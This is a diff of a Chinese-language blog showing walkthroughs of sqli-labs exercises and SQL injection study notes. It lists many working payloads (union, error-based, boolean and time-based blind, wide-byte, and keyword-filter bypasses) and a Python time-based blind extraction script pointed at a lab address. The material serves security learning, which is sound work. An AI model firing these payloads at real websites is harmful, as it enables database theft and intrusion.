+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2&#x27;&#x27;&#x27;union select 1,database(),version()-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226162225320.png" alt="image-20231226162225320"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2&#x27;&#x27;&#x27;union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>information改成infoorrmation</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226162709864.png" alt="image-20231226162709864"></p>
+<p>其他部分参考Less1</p>
+<h3 id="Less25a"><a href="#Less25a" class="headerlink" title="Less25a"></a>Less25a</h3><p>试了一堆后缀，都不行，猜想什么都不加，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226163953971.png" alt="image-20231226163953971"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),version()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226164049284.png" alt="image-20231226164049284"></p>
+<p>只要遇到or时替换成oorr，遇到and替换成anandd，其他部分参考Less1</p>
+<h3 id="Less26"><a href="#Less26" class="headerlink" title="Less26"></a>Less26</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226165848001.png" alt="image-20231226165848001"></p>
+<p>所有的空格和注释都不能用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))||&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;||(extractvalue(1,concat(0x7e,(select(database())),0x7e)))||&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226165832900.png" alt="image-20231226165832900"></p>
+<p>成功，其他部分参考less1</p>
+<h3 id="Less26a"><a href="#Less26a" class="headerlink" title="Less26a"></a>Less26a</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)%26%26length(database())&gt;=8%26%26(&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226185725418.png" alt="image-20231226185725418"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)%26%26length(database())&gt;=9%26%26(&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226185841642.png" alt="image-20231226185841642"></p>
+<p>布尔盲注类型</p>
+<h3 id="Less27"><a href="#Less27" class="headerlink" title="Less27"></a>Less27</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226192130467.png" alt="image-20231226192130467"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226190454505.png" alt="image-20231226190454505"></p>
+<p>union和select不能用，那么可以大小写混用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;or(extractvalue(1,concat(0x7e,(sElEct(database())),0x7e)))or&#x27;0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226190542867.png" alt="image-20231226190542867"></p>
+<h3 id="Less27a"><a href="#Less27a" class="headerlink" title="Less27a"></a>Less27a</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226193805748.png" alt="image-20231226193805748"></p>
+<p>查出该题%0a能够正常显示空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0AUNion%0ASeLect%0A1,database(),3%0A||&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226193751442.png" alt="image-20231226193751442"></p>
+<p>后续参考less1，空格用%0a代替，回显位为2，union与select需要大小字母混写。</p>
+<h3 id="Less28"><a href="#Less28" class="headerlink" title="Less28"></a>Less28</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226200829931.png" alt="image-20231226200829931"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)unIunion%0Aselecton%0AsEleCt%0A3,database(),1%0A||&#x27;1&#x27;=(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226200815227.png" alt="image-20231226200815227"></p>
+<h3 id="Less28a"><a href="#Less28a" class="headerlink" title="Less28a"></a>Less28a</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226201520507.png" alt="image-20231226201520507"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)order by 3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226201420369.png" alt="image-20231226201420369"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)order by 4-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226201444088.png" alt="image-20231226201444088"></p>
+<p>想办法替换union和select即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)uniunion selecton selunion selectect 1,2,3-- -</span><br></pre></td></tr></table></figure>
+
+<p>union改为uniunion selecton</p>
+<p>select改为selunion selectect</p>
+<p>其他部分参考less1</p>
+<h3 id="Less29"><a href="#Less29" class="headerlink" title="Less29"></a>Less29</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226202649492.png" alt="image-20231226202649492"></p>
+<p>this site protected by world’s best firewall&#x2F;</p>
+<p>该网站受世界上最好的防火墙保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226202917883.png" alt="image-20231226202917883"></p>
+<p>闭合找到了，但是网站底部输出的符号内容全是url编码格式</p>
+<p>额</p>
+<p>请直接参考Less1</p>
+<h3 id="Less30（时间盲注）"><a href="#Less30（时间盲注）" class="headerlink" title="Less30（时间盲注）"></a>Less30（时间盲注）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226204754401.png" alt="image-20231226204754401"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;union select 1,2,3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226205113405.png" alt="image-20231226205113405"></p>
+<p>其他参考Less1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226204535732.png" alt="image-20231226204535732"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.45/sqli/Less-30/?id=1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>():</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            params_get = url + <span class="string">f&quot;/**/and/**/if(ascii(substring((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(5),0)--+&quot;</span></span><br><span class="line">            response = session.get(params_get)</span><br><span class="line">            <span class="keyword">if</span> response.elapsed.total_seconds() &gt; <span class="number">3</span>:</span><br><span class="line">                data += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    extract_data()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226204933763.png" alt="image-20231226204933763"></p>
+<h3 id="Less31"><a href="#Less31" class="headerlink" title="Less31"></a>Less31</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226205355421.png" alt="image-20231226205355421"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;)union select 1,database(),version()-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226205442404.png" alt="image-20231226205442404"></p>
+<p>其他参考less1</p>
+<h3 id="Less32-gdk编码"><a href="#Less32-gdk编码" class="headerlink" title="Less32(gdk编码)"></a>Less32(gdk编码)</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226210105451.png" alt="image-20231226210105451"></p>
+<p>Please input the ID as parameter with numeric value<br>请用数值输入ID作为参数</p>
+<p>Hint: The Query String you input is escaped as :The Query String you input in Hex becomes :<br>提示：您输入的查询字符串被转义为：您在十六进制中输入的查询字符串变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226210628853.png" alt="image-20231226210628853"></p>
+<p>其他参考less1</p>
+<h3 id="Less33"><a href="#Less33" class="headerlink" title="Less33"></a>Less33</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226211852207.png" alt="image-20231226211852207"></p>
+<p>参考less1</p>
+<h3 id="Less34"><a href="#Less34" class="headerlink" title="Less34"></a>Less34</h3><p>将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为�’ 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&#x27; union select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226221111106.png" alt="image-20231226221111106"></p>
+<h3 id="Less35"><a href="#Less35" class="headerlink" title="Less35"></a>Less35</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227103447495.png" alt="image-20231227103447495"></p>
+<h3 id="Less36"><a href="#Less36" class="headerlink" title="Less36"></a>Less36</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227103631087.png" alt="image-20231227103631087"></p>
+<h3 id="Less37"><a href="#Less37" class="headerlink" title="Less37"></a>Less37</h3><p>登陆后抓包</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227200544730.png" alt="image-20231227200544730"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&#x27;and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227200610640.png" alt="image-20231227200610640"></p>
+<p>由此可见username部分是回显位，试过password部分没有返回内容。</p>
+<h3 id="Less38"><a href="#Less38" class="headerlink" title="Less38"></a>Less38</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227104524533.png" alt="image-20231227104524533"></p>
+<p>参考Less1</p>
+<h3 id="Less39"><a href="#Less39" class="headerlink" title="Less39"></a>Less39</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227104506832.png" alt="image-20231227104506832"></p>
+<p>其他参考Less1</p>
+<h3 id="Less40"><a href="#Less40" class="headerlink" title="Less40"></a>Less40</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)union select 1,database(),version() -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227104912152.png" alt="image-20231227104912152"></p>
+<h3 id="Less41"><a href="#Less41" class="headerlink" title="Less41"></a>Less41</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227105852801.png" alt="image-20231227105852801"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227110039004.png" alt="image-20231227110039004"></p>
+<h3 id="Less42"><a href="#Less42" class="headerlink" title="Less42"></a>Less42</h3><p>账号：admin</p>
+<p>密码：1</p>
+<p>修改密码后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227111451034.png" alt="image-20231227111451034"></p>
+<p>出现报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,2,3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227112615718.png" alt="image-20231227112615718"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227112629754.png" alt="image-20231227112629754"></p>
+<p>回显位为2，点击logout退出重新在密码框输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227112904077.png" alt="image-20231227112904077"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227113744941.png" alt="image-20231227113744941"></p>
+<p>其他参考less1</p>
+<h3 id="Less43"><a href="#Less43" class="headerlink" title="Less43"></a>Less43</h3>
       
     </div>
   </div>
@@ -595,7 +928,7 @@
 
         <div class="article-meta">
           <a href="/2023/12/18/9.1-sql%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2023-12-18T06:47:33.000Z" itemprop="datePublished">2023-12-18</time>
+  <time datetime="2023-12-18T06:46:51.464Z" itemprop="datePublished">2023-12-18</time>
 </a>
           
           
@@ -604,7 +937,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句"></a>sql语句</h3><p>PS：mysql已经安装好了</p>
+        <h3 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h3><p>常见<em>SQL注入</em>类型（细分七种类型） · 联合注入 · 布尔盲注 · 时间盲注 · 宽字节注入 · 报错注入 · 堆叠注入 · 二次注入.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection(布尔型注入)</span><br><span class="line">E: Error-based SQL injection(报错型注入)</span><br><span class="line">U: UNION query sQL injection(可联合查询注入)</span><br><span class="line">S: Stacked queries sQL injection(可多语句查询注入)</span><br><span class="line">T: Time-based blind sQL injection(基于时间延迟注入</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句"></a>sql语句</h3><p>PS：mysql已经安装好了</p>
 <h5 id="进入mysql："><a href="#进入mysql：" class="headerlink" title="进入mysql："></a>进入mysql：</h5><p>进入命令行窗口：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ....\MySQL版本号\bin # 进入MySQL根目录下的bin目录</span><br></pre></td></tr></table></figure>
 
@@ -752,7 +1088,7 @@ schemata表 - 存储所有数据库名
 <p>表示注释</p>
 <p>而使用<code>-- </code>（有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 <code>--+</code> 的方式来闭合，因为<code>+</code>会被解释成空格。</p>
 <p>注释后面的语句不会被执行，我们可以在注释前执行sql语句获取信息。</p>
-<h4 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><p><strong>数字型注入点</strong></p>
+<h4 id="sql注入类型-1"><a href="#sql注入类型-1" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><p><strong>数字型注入点</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/users.php?id=1</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 数字型驻点常见的注入语句(Payload)</span><br><span class="line">select * from 表名 where id=1 and 1=1</span><br><span class="line"></span><br><span class="line"># 查询数据库名和版本</span><br><span class="line">id=-1 union select 1,database(),version() --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的表名</span><br><span class="line">id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中指定表名中的列名字段</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定表中的数据</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(username,&#x27;:&#x27;,password) from secyrity.users) --+  </span><br></pre></td></tr></table></figure>
@@ -843,36 +1179,92 @@ schemata表 - 存储所有数据库名
 <h5 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101324836.png" alt="image-20231224101324836"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+<h5 id="1-floor报错注入"><a href="#1-floor报错注入" class="headerlink" title="1.floor报错注入"></a>1.floor报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101955130.png" alt="image-20231224101955130"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/a04873f68d674b77846b135fa96f626c.png" alt="img">    </p>
+<h5 id="2-extractvalue报错注入（查询）"><a href="#2-extractvalue报错注入（查询）" class="headerlink" title="2.extractvalue报错注入（查询）"></a>2.extractvalue报错注入（查询）</h5><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br></pre></td></tr></table></figure>
+
+<p><strong>第一个参数</strong>：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p><strong>第二个参数</strong>：XPath_string (Xpath格式的字符串)</p>
+<p><strong>concat</strong>:返回结果为连接参数产生的字符串。</p>
+<p>原理与updatexml格式相似。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102040340.png" alt="image-20231224102040340"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/9206f3c3e01548488f00e41467443ee9.png" alt="img"></p>
+<h5 id="3-updatexml报错注入（修改）"><a href="#3-updatexml报错注入（修改）" class="headerlink" title="3.updatexml报错注入（修改）"></a>3.updatexml报错注入（修改）</h5><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br></pre></td></tr></table></figure>
+
+<p><strong>第一个参数</strong>：XML_document是<strong>String格式</strong>，为XML文档对象的名称</p>
+<p><strong>第二个参数</strong>：XPath_string (<strong>Xpath格式的字符串</strong>)</p>
+<p>​		 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/XPath/5574064">XPath</a>即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的语言。</p>
+<p><strong>第三个参数</strong>：new_value，<strong>String格式</strong>，替换查找到的符合条件的数据 </p>
+<p>原理：</p>
+<p>**由于updatexml的第二个参数需要   <strong>Xpath格式</strong>的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。  **</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102115408.png" alt="image-20231224102115408"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/bb85279b4fbc4de6921bf0859954f919.png" alt="img">    </p>
+<h5 id="4-geometrycollection报错注入"><a href="#4-geometrycollection报错注入" class="headerlink" title="4.geometrycollection报错注入"></a>4.geometrycollection报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102149354.png" alt="image-20231224102149354"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/a4ee464fd7dd48ee88b7faa0c5385600.png" alt="img">    </p>
+<h5 id="5-multipoint报错注入"><a href="#5-multipoint报错注入" class="headerlink" title="5.multipoint报错注入"></a>5.multipoint报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
